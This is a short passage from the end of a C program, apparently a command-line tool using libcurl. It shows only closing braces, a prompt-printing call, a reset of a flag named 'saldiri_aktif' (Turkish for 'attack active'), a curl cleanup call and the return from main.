                prompt_yazdir();
            }
        }
    }
    saldiri_aktif = 0; curl_global_cleanup(); return 0;
}
